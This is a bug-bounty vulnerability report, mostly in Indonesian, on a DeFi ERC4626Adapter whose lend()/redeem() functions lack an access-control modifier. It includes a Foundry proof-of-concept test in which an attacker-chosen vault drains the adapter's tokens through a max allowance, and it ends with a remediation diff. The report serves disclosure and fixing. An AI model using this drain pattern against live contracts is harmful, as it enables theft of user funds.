# F‑01 — `ERC4626Adapter.lend()` / `redeem()` tidak punya `onlyIntegrationManager`

| | |
|---|---|
| **File** | `contracts/release/extensions/integration-manager/integrations/adapters/ERC4626Adapter.sol` |
| **Severity** | Low (Immunefi: butuh dana berada di adaptor) |
| **Status scope** | **OUT OF SCOPE by policy** — program secara eksplisit menolak laporan "missing `onlyIntegrationManager`" bila dana di adaptor hanya bisa muncul via transfer langsung/accidental |
| **PoC** | `tests/F01_ERC4626Adapter_NoAuth.t.sol` |

---

## 1. Vulnerability Summary

`ERC4626Adapter` mengekspos `lend()` dan `redeem()` sebagai `external` **tanpa** modifier
`onlyIntegrationManager` (padahal `AdapterBase` menyediakan modifier itu dan adaptor lain — mis.
`BebopBlendAdapter.action()` — memakainya). Akibatnya siapa pun bisa memanggil adaptor secara langsung
dengan `_assetData` yang ia susun sendiri.

`lend()` melakukan dua hal berurutan yang berbahaya bila dipanggil tanpa otentikasi:

```solidity
function lend(address _vaultProxy, bytes calldata, bytes calldata _assetData) external {   // <-- no auth
    (address[] memory spendAssets, uint256[] memory spendAssetAmounts, address[] memory incomingAssets) =
        __decodeAssetData(_assetData);

    __approveAssetMaxAsNeeded({                    // (1) approve type(uint256).max
        _asset: spendAssets[0], _target: incomingAssets[0], _neededAmount: spendAssetAmounts[0]
    });

    IERC4626(incomingAssets[0]).deposit({assets: spendAssetAmounts[0], receiver: _vaultProxy}); // (2) arbitrary call
}
```

`__approveAssetMaxAsNeeded()` (`contracts/utils/0.8.19/AssetHelpers.sol`) memberi allowance
**`type(uint256).max`** ke `incomingAssets[0]` — alamat yang dipilih pemanggil.

## 2. Impact Assessment

Attacker anonim bisa:

1. **Menarik seluruh saldo token apa pun yang ada di dalam adaptor.** Saldo itu muncul secara wajar
   ketika `IntegrationManager` memakai `SpendAssetsHandleType.Transfer`: IM memindahkan spend asset
   ke adaptor **sebelum** memanggil adaptor (`IntegrationManager.__preProcessCoI`), dan
   `__postProcessCoI` **tidak** mengembalikan sisa spend asset untuk tipe `Transfer`
   (hanya tipe `Approve` yang allowance‑nya direset). Jadi sisa dana (partial fill, aksi yang tidak
   menghabiskan seluruh `maxSpendAssetAmounts`, dll.) tertinggal di adaptor dan bisa di‑sweep siapa pun.
2. **Memakai adaptor sebagai arbitrary‑call primitive** (`deposit()` dieksekusi pada kontrak pilihan
   attacker, dengan dua argumen yang dikendalikan attacker), dari alamat adaptor — yang mungkin punya
   allowance/otorisasi lain di ekosistem.

**Kelas bug yang sama (semua adaptor, bukan hanya ERC4626):** audit grep pada
`contracts/release/extensions/integration-manager/integrations/adapters/` menunjukkan entrypoint tanpa
otentikasi juga ada di `ParaSwapV6Adapter.action()`, `ZeroExV4Adapter.takeOrder()`,
`OneInchV5Adapter.takeOrder()/takeMultipleOrders()/takeOrderAndValidateIncoming()`. Pada `ZeroExV4Adapter`,
`postActionIncomingAssetsTransferHandler(_vaultProxy, _assetData)` akan mem‑push **seluruh** saldo
`incomingAssets` milik adaptor ke `_vaultProxy` — yang juga attacker‑controlled saat dipanggil langsung.
Ini menegaskan bahwa pola ini sudah diketahui pihak program (lihat kutipan OOS di §4 laporan utama).

**Kenapa saya tetap menandainya OOS:** program bounty menulis persis pola ini sebagai contoh invalid
("…due to a missing onlyIntegrationManager check are invalid if the funds can only exist there via
accidental direct transfers, or other non-protocol flows"). Untuk membuatnya valid, Anda harus
membuktikan **alur protokol yang sah** yang meninggalkan dana di adaptor (mis. partial fill pada
adapter `Transfer` yang menghabiskan < `maxSpendAssetAmounts`).

## 3. Executable Foundry PoC

File lengkap: `tests/F01_ERC4626Adapter_NoAuth.t.sol` (sudah saya compile‑check terhadap source repo).

Inti test:

```solidity
function test_AnyoneCanDrainAdapterAndForceArbitraryCall() public {
    usdc.mint(address(adapter), 1_000e18);          // dana yang ada di adaptor

    address[] memory spendAssets        = new address[](1); spendAssets[0]        = address(usdc);
    uint256[] memory spendAssetAmounts  = new uint256[](1); spendAssetAmounts[0]  = 1_000e18;
    address[] memory incomingAssets     = new address[](1); incomingAssets[0]     = address(evilVault); // attacker-chosen
    bytes memory assetData = abi.encode(spendAssets, spendAssetAmounts, incomingAssets);

    vm.prank(ATTACKER);                             // BUKAN IntegrationManager
    adapter.lend(VICTIM_VAULT_PROXY, "", assetData);

    assertEq(usdc.balanceOf(address(adapter)), 0);
    assertEq(usdc.balanceOf(address(evilVault)), 1_000e18);
    assertEq(usdc.allowance(address(adapter), address(evilVault)), type(uint256).max);
}
```

`AttackerControlled4626.deposit()` menarik dana lewat allowance max yang baru saja diberikan adaptor.

Jalankan:

```powershell
forge test --match-path "tests/arena-poc/F01_ERC4626Adapter_NoAuth.t.sol" -vvv
```

## 4. Remediation

```diff
-    function lend(address _vaultProxy, bytes calldata, bytes calldata _assetData) external {
+    function lend(address _vaultProxy, bytes calldata, bytes calldata _assetData)
+        external
+        onlyIntegrationManager
+    {
         ...
     }

-    function redeem(address _vaultProxy, bytes calldata, bytes calldata _assetData) external {
+    function redeem(address _vaultProxy, bytes calldata, bytes calldata _assetData)
+        external
+        onlyIntegrationManager
+    {
         ...
     }
```

(`onlyIntegrationManager` sudah ada di `AdapterBase`; adaptor ini hanya lupa memakainya.)

Pola yang benar — bandingkan:

```solidity
// BebopBlendAdapter.sol
function action(address, bytes calldata _actionData, bytes calldata) external onlyIntegrationManager { ... }
```
